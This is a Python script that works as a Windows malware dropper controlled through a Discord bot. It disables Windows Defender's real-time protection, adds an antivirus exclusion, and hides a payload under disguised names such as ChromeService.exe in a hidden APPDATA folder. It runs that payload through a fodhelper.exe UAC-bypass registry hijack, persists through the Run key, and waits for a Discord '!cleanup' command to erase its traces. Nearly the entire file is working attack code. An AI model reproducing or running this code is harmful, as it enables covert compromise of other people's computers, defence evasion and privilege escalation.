
# === CONFIG ===
DISCORD_TOKEN = ''
CHANNEL_ID = ''
TRIGGER_COMMAND = "!cleanup"

import os
import sys
import subprocess
import shutil
import discord
import winreg
import ctypes
import psutil
import win32api
import win32con

STEALTH_FOLDER = os.path.join(os.getenv("APPDATA"), "AdobeSync")
SELF_NAME = "WinDriver.exe"
PAYLOAD_TXT = "payload.txt"
PAYLOAD_EXE = "payload.exe"
PAYLOAD_TARGET_NAME = "ChromeService.exe"
# ==============

running_file = os.path.abspath(sys.argv[0])
if running_file.endswith(".py"):
    SELF_NAME = "WinDriver.py"

target_self_path = os.path.join(STEALTH_FOLDER, SELF_NAME)
target_payload_path = os.path.join(STEALTH_FOLDER, PAYLOAD_TARGET_NAME)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def relaunch_as_admin():
    print("[!] Not admin. Relaunching with elevation...")
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
    sys.exit()


def disable_defender():
    subprocess.run([
        "powershell", "-Command",
        "Set-MpPreference -DisableRealtimeMonitoring $true"
    ], shell=True)
    print("[+] Defender disabled")


def add_defender_exclusion():
    subprocess.run([
        "powershell", "-Command",
        f'Add-MpPreference -ExclusionPath "{STEALTH_FOLDER}"'
    ], shell=True)
    print(f"[+] Defender exclusion added: {STEALTH_FOLDER}")


def remove_defender_exclusion():
    subprocess.run([
        "powershell", "-Command",
        f'Remove-MpPreference -ExclusionPath "{STEALTH_FOLDER}"'
    ], shell=True)
    print(f"[+] Defender exclusion removed: {STEALTH_FOLDER}")


def enable_defender():
    subprocess.run([
        "powershell", "-Command",
        "Set-MpPreference -DisableRealtimeMonitoring $false"
    ], shell=True)
    print("[+] Defender re-enabled")


def rename_payload():
    if os.path.exists(PAYLOAD_TXT):
        os.rename(PAYLOAD_TXT, PAYLOAD_EXE)
        print("[+] Renamed payload.txt → payload.exe")


def run_payload_with_uac_bypass(payload_path):
    """
    Executes the payload with elevated privileges by hijacking the fodhelper.exe process.
    This avoids a second UAC prompt.
    """
    reg_path = r"Software\Classes\ms-settings\shell\open\command"
    try:
        print("[*] Attempting UAC bypass to launch payload...")
        # Create the necessary registry keys
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        # Trigger fodhelper.exe, which is an auto-elevating binary
        subprocess.run(["C:\\Windows\\System32\\fodhelper.exe"], shell=True, check=True)
        print(f"[+] Payload launched with admin privileges via UAC bypass: {payload_path}")

    except Exception as e:
        print(f"[!] UAC bypass failed: {e}")
        DETACHED = 0x00000008
        NOWINDOW = 0x08000000
        subprocess.Popen([payload_path], creationflags=DETACHED | NOWINDOW)
        print("[!] Launched payload with standard privileges as fallback.")

    finally:
        try:
            subprocess.run(['reg.exe', 'delete', r'HKCU\Software\Classes\ms-settings', '/f'], shell=True, check=False)
            print("[+] UAC bypass registry keys cleaned up.")
        except Exception as e:
            print(f"[!] Failed to cleanup registry keys: {e}")


def deploy():
    print("[*] Deploying to", STEALTH_FOLDER)
    os.makedirs(STEALTH_FOLDER, exist_ok=True)
    subprocess.call(['attrib', '+h', STEALTH_FOLDER])

    shutil.copy2(PAYLOAD_EXE, target_payload_path)
    shutil.copy2(running_file, target_self_path)
    print("[+] Files copied")

    run_payload_with_uac_bypass(target_payload_path)

    add_to_startup(target_self_path)


def add_to_startup(path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WinDriver", 0, winreg.REG_SZ, path)
    winreg.CloseKey(key)
    print("[+] Added to startup")


def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "WinDriver")
        winreg.CloseKey(key)
        print("[+] Removed from startup")
    except:
        print("[!] Startup key not found")


def kill_payload():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if PAYLOAD_TARGET_NAME.lower() in proc.info['name'].lower():
                proc.kill()
                print(f"[+] Killed payload process: {proc.info['name']}")
        except:
            continue


# === DISCORD BOT ===
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f"[+] Bot is online as {client.user}")
    try:
        channel = await client.fetch_channel(CHANNEL_ID)
        await channel.send("🚀 Bot is now running.")
    except:
        pass


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.id == CHANNEL_ID:
        if message.content.strip() == "!ping":
            await message.channel.send("🏓 Pong!")

        elif message.content.strip() == TRIGGER_COMMAND:
            try:
                kill_payload()
                if os.path.exists(target_payload_path):
                    try:
                        os.remove(target_payload_path)
                        print("[+] Payload deleted")
                    except PermissionError:
                        print("[!] Payload is locked, scheduling for deletion...")
                        win32api.MoveFileEx(target_payload_path, None, win32con.MOVEFILE_DELAY_UNTIL_REBOOT)

                remove_from_startup()
                remove_defender_exclusion()
                enable_defender()

                await message.channel.send("🧹 Cleanup complete. Self-destructing.")

                # === MODIFIED: Schedules the deletion of the entire stealth folder ===
                print(f"[+] Scheduling deletion of stealth folder: {STEALTH_FOLDER}")
                delete_self_cmd = f'cmd /c ping localhost -n 3 >nul && rmdir /s /q "{STEALTH_FOLDER}"'
                # ======================================================================

                subprocess.Popen(delete_self_cmd, shell=True)
                await client.close()
            except Exception as e:
                await message.channel.send(f"❌ Cleanup error: {e}")


# === MAIN RUN ===
if not is_admin():
    relaunch_as_admin()

disable_defender()
add_defender_exclusion()
rename_payload()
deploy()
client.run(DISCORD_TOKEN)